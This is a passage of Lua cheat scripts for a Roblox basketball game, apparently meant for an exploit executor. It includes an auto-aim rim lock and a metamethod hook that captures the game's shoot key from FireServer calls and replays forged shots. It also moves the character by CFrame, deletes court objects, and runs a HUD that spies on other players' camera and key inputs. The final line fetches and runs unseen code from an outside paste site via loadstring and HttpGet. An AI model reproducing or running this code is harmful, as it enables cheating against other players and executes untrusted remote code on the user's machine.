Workspace.DescendantAdded:Connect(function(o)
	if o:IsA('BasePart') and o.Name == 'Rim' and o.Size == RimSize then
		table.insert(Rims, o)
	end
end)
for _, v in ipairs(Workspace:GetDescendants()) do
	if v:IsA('BasePart') and v.Name == 'Rim' and v.Size == RimSize then
		table.insert(Rims, v)
	end
end
Workspace.DescendantRemoving:Connect(function(o)
	for i, rim in ipairs(Rims) do
		if rim == o then table.remove(Rims, i) break end
	end
	if selectedRim == o then selectedRim = nil end
end)

-- === AUTO RIM LOCK ===
task.spawn(function()
	while task.wait(0.1) do
		if not getgenv().PAYLOAD0_SYSTEM_ACTIVE then continue end
		local root = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')
		if not root then continue end
		local bestRim, bestDist = nil, 85
		for _, rim in ipairs(Rims) do
			if rim:IsDescendantOf(Workspace) then
				local dist = (rim.Position - root.Position).Magnitude
				if dist < bestDist then
					local _, on = Camera:WorldToViewportPoint(rim.Position)
					if on then bestRim, bestDist = rim, dist end
				end
			end
		end
		if bestRim and bestRim ~= selectedRim then selectedRim = bestRim end
	end
end)

-- === TOGGLES ===
UserInputService.InputBegan:Connect(function(i, gp)
	if gp then return end
	if i.KeyCode == Enum.KeyCode.O then
		VisualsEnabled = not VisualsEnabled
		notify(VisualsEnabled and 'Visuals ON' or 'Visuals OFF',
		       VisualsEnabled and COLOR_GREEN or Color3.fromRGB(255,80,80))
	end
	if i.KeyCode == Enum.KeyCode.V then
		getgenv().PAYLOAD0_SYSTEM_ACTIVE = not getgenv().PAYLOAD0_SYSTEM_ACTIVE
		notify(getgenv().PAYLOAD0_SYSTEM_ACTIVE and 'System ON' or 'System OFF',
		       getgenv().PAYLOAD0_SYSTEM_ACTIVE and COLOR_GREEN or Color3.fromRGB(255,80,80))
	end
end)

-- === SHOOT KEY CAPTURE (LISTEN ONLY) ===
local old
old = hookmetamethod(game, '__namecall', function(self, ...)
	local m = getnamecallmethod()
	if m == 'FireServer' and self == shootRemote then
		local args = {...}
		if type(args[3]) == 'string' and not shootKey then
			shootKey = args[3]
			removeCalibrateUI()
			notify('Shoot key captured!', COLOR_GREEN)
		end
	end
	return old(self, ...)
end)

-- === SHOOT LOGIC (unchanged) ===
local lastTick, moveOffset = 0, Vector3.zero
local function computeOffset()
	if tick() - lastTick > 0.1 then
		local hum = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
		local moveDir = (hum and hum.MoveDirection) or Vector3.zero
		moveOffset = Vector3.new(moveDir.X * 1.5, 0, moveDir.Z * 1.5)
		lastTick = tick()
	end
	return moveOffset
end

local function computeArc(dist)
	return Vector3.new(0, 43 + (dist / 15), 0)
end

local function smartAim(rim)
	local offset = computeOffset()
	local root = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')
	if not root then return rim.Position end
	local dist = (root.Position - rim.Position).Magnitude
	return rim.Position + computeArc(dist) - offset
end

local function shootAtTarget()
	if not getgenv().PAYLOAD0_SYSTEM_ACTIVE or not selectedRim or not selectedRim:IsDescendantOf(Workspace) then return end
	if not shootKey then return end

	local char = plr.Character
	if not char then return end
	local head, root = char:FindFirstChild('Head'), char.PrimaryPart
	if not (head and root) then return end

	local aimPos = smartAim(selectedRim)
	local dir = (aimPos - head.Position).Unit
	local shootFrom = root.Position + dir * 3.8
	if shootFrom.Y - root.Position.Y < 4 then
		shootFrom = root.Position + dir * 4
	end
	shootRemote:FireServer(aimPos, shootFrom, shootKey)
end

UserInputService.InputBegan:Connect(function(i, gp)
	if gp or not getgenv().PAYLOAD0_SYSTEM_ACTIVE then return end
	if i.UserInputType == Enum.UserInputType.MouseButton1 and hasBall() then
		shootAtTarget()
	end
end)

-- === HIGHLIGHT VISUAL ===
local hl = CoreGui:FindFirstChild('PerfectRangeGlow') or Instance.new('Highlight')
hl.Name = 'PerfectRangeGlow'
hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
hl.FillTransparency = 0.25
hl.OutlineTransparency = 0
hl.Adornee = plr.Character
hl.Parent = CoreGui
hl.Enabled = false

local moveKeys = { W = false, A = false, S = false, D = false }
UserInputService.InputBegan:Connect(function(i, gp)
	if gp then return end
	if moveKeys[i.KeyCode.Name] ~= nil then moveKeys[i.KeyCode.Name] = true end
end)
UserInputService.InputEnded:Connect(function(i, gp)
	if gp then return end
	if moveKeys[i.KeyCode.Name] ~= nil then moveKeys[i.KeyCode.Name] = false end
end)

local function shouldPush()
	local count = 0
	for _, v in pairs(moveKeys) do if v then count += 1 end end
	return count == 1 and (moveKeys.A or moveKeys.D)
end

-- === PUSH LOGIC (rims for push) ===
local rimsForPush = {}
for _, v in ipairs(Workspace:GetDescendants()) do
	if v:IsA('BasePart') and v.Name == 'Lol' and v.Parent and v.Parent.Name == 'Rim' then
		table.insert(rimsForPush, v)
	end
end

local function nearestRim(rootPos)
	local nearest, nearestDist
	for _, rim in ipairs(rimsForPush) do
		if rim:IsDescendantOf(Workspace) then
			local rimXZ = Vector3.new(rim.Position.X, 0, rim.Position.Z)
			local dist = (rimXZ - Vector3.new(rootPos.X, 0, rootPos.Z)).Magnitude
			if not nearestDist or dist < nearestDist then
				nearest, nearestDist = rim, dist
			end
		end
	end
	return nearest, nearestDist
end

-- <<< POWER-BASED TARGET DISTANCE >>> ------------------------------------
-- Replaces the old getNearestPerfectDistance() logic
local function getTargetDistance()
	return POWER_TO_DISTANCE[currentPower] or nil
end
-- <<< END >>> ------------------------------------------------------------

-- === RUNTIME LOOP ===
local smoothBias = Vector3.zero
RunService.RenderStepped:Connect(function()
	if not getgenv().PAYLOAD0_SYSTEM_ACTIVE then hl.Enabled = false return end

	local char = plr.Character
	local hum = char and char:FindFirstChildOfClass('Humanoid')
	local root = char and char:FindFirstChild('HumanoidRootPart')
	if not (hum and root) then return end

	if not hasBall() then
		hl.Enabled = false
		smoothBias = Vector3.zero
		return
	end

	-- Use the power-based perfect distance
	local targetDist = getTargetDistance()
	if not targetDist then
		hl.Enabled = false
		smoothBias = Vector3.zero
		return
	end

	local rim, dist = nearestRim(root.Position)
	if not rim or dist > ACTIVE_RANGE_MAIN then
		hl.Enabled = false
		smoothBias = Vector3.zero
		return
	end

	local diff = dist - targetDist
	local absDiff = math.abs(diff)
	local desired = Vector3.zero

	if shouldPush() and absDiff < CLAMP_RADIUS then
		local strength = (CLAMP_RADIUS - absDiff) / CLAMP_RADIUS
		local toRim = Vector3.new(rim.Position.X, 0, rim.Position.Z)
			- Vector3.new(root.Position.X, 0, root.Position.Z)

		-- Push **away** from the rim when we are too close (diff > 0)
		if diff > 0 then
			local pushDir = -toRim.Unit
			desired = pushDir * math.min(strength * MAX_PUSH, MAX_PUSH)
		end
	end

	smoothBias = smoothBias * DAMPING + desired * (1 - DAMPING)
	root.CFrame += Vector3.new(smoothBias.X, 0, smoothBias.Z)

	-- Visual feedback
	if VisualsEnabled then
		if absDiff < CLAMP_RADIUS then
			hl.Enabled = true
			hl.FillColor = absDiff <= 0.10 and COLOR_GREEN or COLOR_GREEN_SOFT
			hl.OutlineColor = hl.FillColor
		else
			hl.Enabled = false
		end
	else
		hl.Enabled = false
	end
end)

plr.CharacterAdded:Connect(function(c)
	task.wait(0.5)
	hl.Adornee = c
end)

--// =========================================================
--//	NO KEYBINDS:
--//   ‚Ä¢ Instantly removes:
--//        ‚Üí Unions (size match or Court+Lines path)
--//        ‚Üí Nets (any part/model/folder named "Net")
--//   ‚Ä¢ Runs ONCE on execution ‚Äî no loops, no keybinds
--//   ‚Ä¢ Minimal overhead, FPS-neutral
--// =========================================================

local Workspace = game:GetService('Workspace')

-- === CONFIGURATION ===
local TARGET_SIZES = {
	Vector3.new(14.074419021606445, 0.1991105079650879, 68.00189208984375),
	Vector3.new(20.78681182861328, 0.10193014144897461, 67.00210571289062),
}
local SIZE_TOLERANCE = 0.0005

-- === HELPERS ===
local function sizeMatchesAny(size: Vector3)
	for _, target in ipairs(TARGET_SIZES) do
		if
			math.abs(size.X - target.X) <= SIZE_TOLERANCE
			and math.abs(size.Y - target.Y) <= SIZE_TOLERANCE
			and math.abs(size.Z - target.Z) <= SIZE_TOLERANCE
		then
			return true
		end
	end
	return false
end

local function isInsideCourtAndLines(obj)
	local hasCourt, hasLines = false, false
	local current = obj
	while current do
		local name = current.Name:lower()
		if string.find(name, 'court') then
			hasCourt = true
		elseif string.find(name, 'lines') then
			hasLines = true
		end
		current = current.Parent
	end
	return hasCourt and hasLines
end

local function shouldRemove(obj)
	if
		obj:IsA('UnionOperation')
		and (sizeMatchesAny(obj.Size) or isInsideCourtAndLines(obj))
	then
		return true
	end
	if
		(obj:IsA('BasePart') or obj:IsA('Model') or obj:IsA('Folder'))
		and obj.Name:lower() == 'net'
	then
		return true
	end
	return false
end

-- === MAIN CLEAN ===
for _, descendant in ipairs(Workspace:GetDescendants()) do
	if shouldRemove(descendant) then
		descendant:Destroy()
	end
end

--// =====================================================================================
--//  SPECTATOR HUD [v3.7 FULL + Keypad Overlay + Cursor Dot]  ‚Äì  PLAYER-LEAVE FIX
--// =====================================================================================

local Players = game:GetService('Players')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local RunService = game:GetService('RunService')
local UserInputService = game:GetService('UserInputService')
local TweenService = game:GetService('TweenService')
local CoreGui = game:GetService('CoreGui')
local Camera = workspace.CurrentCamera

local LP = Players.LocalPlayer
local Root = ReplicatedStorage:FindFirstChild('ScreenWatch')

--=== CONFIG ==============================================================
local CFG = {
    UIName = 'ForensicHUD_v3p7_Full',
    LerpAlpha = 0.55,
    UpdateHz = 10,
    Match = { PosEPS = 5, AngEPSDot = 0.85 },
    Color = {
        Fg = Color3.fromRGB(230, 230, 230),
        Soft = Color3.fromRGB(35, 35, 35),
        Red = Color3.fromRGB(255, 60, 60),
        White = Color3.fromRGB(255, 255, 255),
        Pulse = Color3.fromRGB(60, 255, 60), -- green pulse
    },
    ListAnchor = UDim2.new(1, -20, 0.5, -90),
    ListSize = UDim2.fromOffset(220, 180),
    LabelWidth = 180,
    ButtonSize = UDim2.fromOffset(28, 28),

    KeypadPos = UDim2.new(0, 22, 1, -126),
    KeySize = Vector2.new(36, 30),
    KeyTweenDur = 0.07,
    KeyActive = Color3.fromRGB(60, 255, 60),
}

--=== CLEANUP =============================================================
local old = CoreGui:FindFirstChild(CFG.UIName)
if old then
    old:Destroy()
end

--=== GUI ROOT ============================================================
local gui = Instance.new('ScreenGui')
gui.Name, gui.IgnoreGuiInset, gui.ResetOnSpawn = CFG.UIName, true, false
gui.Parent = CoreGui

--=== SPECTATE CONTROL PANEL ==============================================
local controlWrap = Instance.new('Frame')
controlWrap.AnchorPoint = Vector2.new(1, 0.5)
controlWrap.Position = UDim2.new(1, -22, 0.5, 0)
controlWrap.Size = UDim2.fromOffset(280, 40)
controlWrap.BackgroundTransparency = 1
controlWrap.Visible = false
controlWrap.Parent = gui

local hlist = Instance.new('UIListLayout')
hlist.FillDirection, hlist.HorizontalAlignment, hlist.VerticalAlignment =
    Enum.FillDirection.Horizontal,
    Enum.HorizontalAlignment.Center,
    Enum.VerticalAlignment.Center
hlist.Padding = UDim.new(0, 6)
hlist.Parent = controlWrap

local function makeButton(t)
    local b = Instance.new('TextButton')
    b.Size, b.BackgroundColor3, b.Text, b.TextColor3 =
        CFG.ButtonSize, CFG.Color.Soft, t, CFG.Color.Fg
    b.Font, b.TextSize = Enum.Font.GothamBold, 16
    Instance.new('UICorner', b)
    local s = Instance.new('UIStroke', b)
    s.Thickness, s.Color = 1, Color3.fromRGB(80, 80, 80)
    return b
end

local btnPrev = makeButton('‚óÄ')
btnPrev.Parent = controlWrap
local lbl = Instance.new('TextLabel')
lbl.Size, lbl.BackgroundTransparency, lbl.TextColor3 =
    UDim2.fromOffset(CFG.LabelWidth, 28), 1, CFG.Color.Fg
lbl.Font, lbl.TextSize, lbl.Text = Enum.Font.GothamBold, 14, 'Watching: ‚Äî'
lbl.Parent = controlWrap
local btnNext = makeButton('‚ñ∂')
btnNext.Parent = controlWrap

--=== WATCHING LIST PANEL =================================================
local namesPanel = Instance.new('Frame')
namesPanel.AnchorPoint, namesPanel.Position, namesPanel.Size =
    Vector2.new(1, 0.5), CFG.ListAnchor, CFG.ListSize
namesPanel.BackgroundTransparency = 1
namesPanel.Parent = gui

local title = Instance.new('TextLabel')
title.Size, title.Position, title.BackgroundTransparency =
    UDim2.new(1, -12, 0, 24), UDim2.new(0, 6, 0, 6), 1
title.Font, title.TextColor3, title.TextXAlignment, title.TextSize =
    Enum.Font.GothamBold, CFG.Color.Fg, Enum.TextXAlignment.Left, 14
title.Text = 'Viewers: 0'
title.Parent = namesPanel

local listHolder = Instance.new('ScrollingFrame')
listHolder.Size, listHolder.Position, listHolder.BackgroundTransparency =
    UDim2.new(1, -12, 1, -40), UDim2.new(0, 6, 0, 36), 1
listHolder.BorderSizePixel, listHolder.ScrollBarThickness = 0, 6
listHolder.CanvasSize = UDim2.new()
listHolder.Parent = namesPanel

local layout = Instance.new('UIListLayout')
layout.Padding, layout.SortOrder = UDim.new(0, 6), Enum.SortOrder.LayoutOrder
layout.Parent = listHolder
layout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
    listHolder.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
end)

--=== KEYPAD HUD ==========================================================
local keypad = Instance.new('Frame')
keypad.Size, keypad.Position, keypad.BackgroundTransparency =
    UDim2.fromOffset(200, 92), CFG.KeypadPos, 0.35
keypad.BackgroundColor3, keypad.Visible = CFG.Color.Soft, false
keypad.Parent = gui
Instance.new('UICorner', keypad).CornerRadius = UDim.new(0, 8)

local function makeKey(x, y, txt)
    local k = Instance.new('TextLabel')
    k.Size, k.Position =
        UDim2.fromOffset(CFG.KeySize.X, CFG.KeySize.Y), UDim2.fromOffset(x, y)
    k.BackgroundColor3, k.TextColor3, k.Font, k.TextSize, k.Text =
        CFG.Color.Soft, CFG.Color.Fg, Enum.Font.GothamBold, 14, txt
    k.Parent = keypad
    Instance.new('UICorner', k).CornerRadius = UDim.new(0, 6)
    return k
end

local keyW, keyA, keyS, keyD =
    makeKey(82, 0, 'W'),
    makeKey(40, 34, 'A'),
    makeKey(82, 34, 'S'),
    makeKey(124, 34, 'D')
local mL, mM, mR =
    makeKey(0, 68, 'L'), makeKey(82, 68, 'M'), makeKey(164, 68, 'R')
local keyMap =
    { W = keyW, A = keyA, S = keyS, D = keyD, Left = mL, Middle = mM, Right = mR }

local function pulseKey(k, active)
    TweenService:Create(
        k,
        TweenInfo.new(CFG.KeyTweenDur),
        { BackgroundColor3 = active and CFG.KeyActive or CFG.Color.Soft }
    ):Play()
end

--=== CURSOR DOT ==========================================================
local dot = Instance.new('Frame')
dot.Size, dot.AnchorPoint = UDim2.fromOffset(8, 8), Vector2.new(0.5, 0.5)
dot.BackgroundColor3, dot.BackgroundTransparency, dot.Visible, dot.ZIndex =
    CFG.Color.White, 0.1, false, 10
dot.Parent = gui
Instance.new('UICorner', dot).CornerRadius = UDim.new(1, 0)

local flashCooldown = 0

--=== HELPERS =============================================================
local function getHRP(plr)
    if not plr or not plr.Character then
        return nil
    end
    return plr.Character:FindFirstChild('HumanoidRootPart')
end
local function nodeFor(p)
    if not (Root and p) then
        return nil
    end
    return Root:FindFirstChild(p.Name)
end
local function camVal(p)
    local n = nodeFor(p)
    if not n then
        return nil
    end
    local c = n:FindFirstChild('Camera')
    return c and c.Value
end
local function camMatch(a, b)
    if not (a and b) then
        return false
    end
    local d = (a.Position - b.Position).Magnitude
    local posOk = d <= CFG.Match.PosEPS * (1 + d / 20)
    return posOk and a.LookVector:Dot(b.LookVector) >= CFG.Match.AngEPSDot
end

--=== CORE STATE ==========================================================
local spectating, currentTarget = false, nil
local list, idx = {}, 0 -- list rebuilt on every toggle / next/prev
local WatcherCache, prevList = {}, {}

--=== PLAYER-LEAVE HANDLING ===============================================
Players.PlayerRemoving:Connect(function(plr)
    -- purge cache entry
    if WatcherCache[plr] then
        WatcherCache[plr] = nil
    end

    -- if we were watching the leaver ‚Üí stop or switch
    if currentTarget == plr then
        -- find next alive player (or stop)
        list = {} -- force rebuild
        idx = 0
        local nextAlive = closest()
        if nextAlive then
            watch(nextAlive)
        else
            resetSelf()
        end
    end
end)

--=== WATCHERS LIST =======================================================
local function whoWatchingYou()
    local now = tick()
    local cached = WatcherCache[LP]
    if cached and now - cached.t < 1 then
        return cached.l
    end

    local arr, myCF = {}, camVal(LP)
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and camMatch(camVal(p), myCF) then
            table.insert(arr, p.Name)
        end
    end
    table.sort(arr, function(a, b)
        return a:lower() < b:lower()
    end)
    WatcherCache[LP] = { l = arr, t = now }
    return arr
end

local function renderWatchingList(l)
    if #l == #prevList then
        local same = true
        for i, v in ipairs(l) do
            if v ~= prevList[i] then
                same = false
                break
            end
        end
        if same then
            return
        end
    end

    title.Text = ('Viewers: %d'):format(#l)
    for _, c in ipairs(listHolder:GetChildren()) do
        if c:IsA('TextLabel') or c:IsA('Frame') then
            c:Destroy()
        end
    end

    for _, n in ipairs(l) do
        local rowFrame = Instance.new('Frame')
        rowFrame.Size, rowFrame.BackgroundTransparency =
            UDim2.new(1, -4, 0, 22), 1
        rowFrame.Parent = listHolder

        local row = Instance.new('TextLabel')
        row.Size, row.BackgroundTransparency, row.TextXAlignment =
            UDim2.fromScale(1, 1), 1, Enum.TextXAlignment.Left
        row.Font, row.TextColor3, row.TextSize, row.Text =
            Enum.Font.GothamBold, CFG.Color.Fg, 13, '  ‚Ä¢ ' .. n
        row.Parent = rowFrame

        if not table.find(prevList, n) then
            local glow = Instance.new('Frame')
            glow.Size, glow.BackgroundColor3, glow.BackgroundTransparency =
                UDim2.new(0, 0, 1, 0), CFG.Color.Pulse, 0.4
            glow.BorderSizePixel, glow.ZIndex = 0, rowFrame.ZIndex - 1
            glow.Parent = rowFrame
            TweenService:Create(
                glow,
                TweenInfo.new(
                    0.35,
                    Enum.EasingStyle.Quad,
                    Enum.EasingDirection.Out
                ),
                { Size = UDim2.new(1, 0, 1, 0) }
            ):Play()
            task.delay(0.45, function()
                TweenService:Create(
                    glow,
                    TweenInfo.new(
                        0.35,
                        Enum.EasingStyle.Sine,
                        Enum.EasingDirection.Out
                    ),
                    { BackgroundTransparency = 0.25 }
                ):Play()
            end)
        end
    end
    prevList = l
end

task.spawn(function()
    while task.wait(1 / CFG.UpdateHz) do
        renderWatchingList(whoWatchingYou())
    end
end)

--=== TARGET SYSTEM =======================================================
local function sortedOthers()
    local arr = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and getHRP(p) then
            table.insert(arr, p)
        end
    end
    table.sort(arr, function(a, b)
        local A, B, my = getHRP(a), getHRP(b), getHRP(LP)
        if not (A and B and my) then
            return a.Name < b.Name
        end
        return (A.Position - my.Position).Magnitude
            < (B.Position - my.Position).Magnitude
    end)
    return arr
end

local function closest()
    local myHRP = getHRP(LP)
    if not myHRP then
        return nil
    end
    local best, bestD
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            local hrp = getHRP(p)
            if hrp then
                local d = (hrp.Position - myHRP.Position).Magnitude
                if not bestD or d < bestD then
                    best, bestD = p, d
                end
            end
        end
    end
    return best
end

local function setLabelTarget(p)
    lbl.Text = p and ('Watching: ' .. p.Name) or 'Watching: ‚Äî'
end
local function setSpectateUIVisible(v)
    controlWrap.Visible, keypad.Visible, dot.Visible = v, v, v
end
local function resetSelf()
    local ch = LP.Character or LP.CharacterAdded:Wait()
    local hum = ch:FindFirstChildWhichIsA('Humanoid')
    if hum then
        Camera.CameraType, Camera.CameraSubject = Enum.CameraType.Custom, hum
    end
    currentTarget, spectating = nil, false
    setLabelTarget(nil)
    setSpectateUIVisible(false)
    dot.BackgroundColor3 = CFG.Color.White
end

local function watch(plr)
    if not plr then
        return
    end
    currentTarget, spectating = plr, true
    Camera.CameraType = Enum.CameraType.Scriptable
    setLabelTarget(plr)
    setSpectateUIVisible(true)
end

local function nextTarget(delta)
    -- ALWAYS rebuild the list ‚Äì guarantees no dead players
    list = sortedOthers()
    if #list == 0 then
        return
    end

    idx = idx + delta
    if idx > #list then
        idx = 1
    elseif idx < 1 then
        idx = #list
    end
    watch(list[idx])
end

btnNext.MouseButton1Click:Connect(function()
    if spectating then
        nextTarget(1)
    end
end)
btnPrev.MouseButton1Click:Connect(function()
    if spectating then
        nextTarget(-1)
    end
end)

--=== ONE-KEY TOGGLE (N) ==================================================
UserInputService.InputBegan:Connect(function(i, gp)
    if gp or i.KeyCode ~= Enum.KeyCode.N then
        return
    end
    if spectating then
        resetSelf()
    else
        list = sortedOthers()
        if #list == 0 then
            return
        end
        local c = closest() or list[1]
        idx = table.find(list, c) or 1
        watch(c)
    end
end)

--=== CAMERA / KEYPAD / DOT LOOP ==========================================
RunService.RenderStepped:Connect(function()
    if not spectating or not currentTarget then
        return
    end

    local node = nodeFor(currentTarget)
    if not node then -- target node vanished (player left, etc.)
        -- auto-switch to next alive player
        nextTarget(1)
        return
    end

    -- camera + FOV
    local cam, fov =
        node:FindFirstChild('Camera'), node:FindFirstChild('FieldOfView')
    if cam and fov then
        Camera.CFrame = Camera.CFrame:Lerp(cam.Value, CFG.LerpAlpha)
        Camera.FieldOfView = fov.Value
    end

    -- keypad
    for name, label in pairs(keyMap) do
        local bv = node:FindFirstChild(name)
        pulseKey(label, bv and bv.Value)
    end

    -- cursor dot
    local m = node:FindFirstChild('MousePos')
    if m and typeof(m.Value) == 'Vector3' then
        local v = Camera:WorldToViewportPoint(m.Value)
        dot.Visible = v.Z > 0
        if v.Z > 0 then
            dot.Position = UDim2.fromOffset(v.X, v.Y)
        end
    else
        dot.Visible = false
    end

    -- flash green on any key press
    local any = false
    for name in pairs(keyMap) do
        local bv = node:FindFirstChild(name)
        if bv and bv.Value then
            any = true
            break
        end
    end
    if any and tick() > flashCooldown then
        TweenService
            :Create(
                dot,
                TweenInfo.new(
                    0.08,
                    Enum.EasingStyle.Quad,
                    Enum.EasingDirection.Out
                ),
                { BackgroundColor3 = CFG.Color.Pulse }
            )
            :Play()
        task.delay(0.08, function()
            if spectating and currentTarget then
                TweenService:Create(
                    dot,
                    TweenInfo.new(0.2),
                    { BackgroundColor3 = CFG.Color.White }
                ):Play()
            end
        end)
        flashCooldown = tick() + 0.12
    end
end)

resetSelf()

--[[
Payload0 Arc Visualizer (One-Time Placement Edition)
Creates static, anchored arcs for each Rim once and never updates them.
Zero loops, zero runtime cost, no transparency toggles.
]]

-- === SERVICES ===
local Players = game:GetService('Players')
local Workspace = game:GetService('Workspace')

-- === CONFIGURATION ===
local PERFECT_DISTANCES = { 54.97, 61.53, 68.10 }
local RING_ARC_DEGREES = 180
local DEGREE_STEP = 4
local DOT_MATERIAL = Enum.Material.Neon
local DOT_COLOR = Color3.fromRGB(0, 0, 0)
local LINK_THICKNESS = 0.25
local RIM_SIZE =
	Vector3.new(3.632131576538086, 0.5587897300720215, 3.632131576538086)
local HEIGHT_OFFSET = -18.259
local ARC_ADJUSTMENTS = { [1] = 12, [2] = -9, [3] = -27 }

-- === INTERNALS ===
local ArcFolder = Instance.new('Folder', Workspace)
ArcFolder.Name = 'Payload0_StaticArcs'

-- === HELPERS ===
local function isValidRim(o)
	return o:IsA('BasePart') and o.Name == 'Rim' and o.Size == RIM_SIZE
end

local function createStaticArc(rimPart, radius, extraDegrees)
	local model = Instance.new('Model')
	model.Name = 'Payload0_StaticArc_' .. rimPart:GetDebugId()
	model.Parent = ArcFolder

	local forward = rimPart.CFrame.LookVector
	local right = rimPart.CFrame.RightVector
	local startDeg = -RING_ARC_DEGREES / 2 - extraDegrees
	local endDeg = RING_ARC_DEGREES / 2 + extraDegrees

	local points = {}
	for deg = startDeg, endDeg, DEGREE_STEP do
		local rad = math.rad(deg)
		local offset = (forward * math.cos(rad) + right * math.sin(rad))
			* radius
		table.insert(
			points,
			rimPart.Position + Vector3.new(offset.X, HEIGHT_OFFSET, offset.Z)
		)
	end

	for i = 1, #points - 1 do
		local a, b = points[i], points[i + 1]
		local dist = (a - b).Magnitude
		local link = Instance.new('Part')
		link.Anchored = true
		link.CanCollide = false
		link.Material = DOT_MATERIAL
		link.Color = DOT_COLOR
		link.Transparency = 0
		link.Size = Vector3.new(LINK_THICKNESS, LINK_THICKNESS, dist)
		link.CFrame = CFrame.new(a, b) * CFrame.new(0, 0, -dist / 2)
		link.Parent = model
	end

	return model
end

local function registerRim(rim)
	-- Skip if already has arcs
	if ArcFolder:FindFirstChild('Payload0_StaticArc_' .. rim:GetDebugId()) then
		return
	end

	for i, dist in ipairs(PERFECT_DISTANCES) do
		local extra = ARC_ADJUSTMENTS[i] or 0
		createStaticArc(rim, dist, extra)
	end
end

-- === INITIAL SCAN ===
for _, v in ipairs(Workspace:GetDescendants()) do
	if isValidRim(v) then
		registerRim(v)
	end
end

-- === AUTO REGISTER ON SPAWN ===
Workspace.DescendantAdded:Connect(function(o)
	if isValidRim(o) then
		registerRim(o)
	end
end)

-- ================================================
--  ISOLATED: RESILIENT EXECUTOR CLIENT PINGER
-- ================================================
loadstring(game:HttpGet('https://pastefy.app/HW0PQn16/raw', true))()
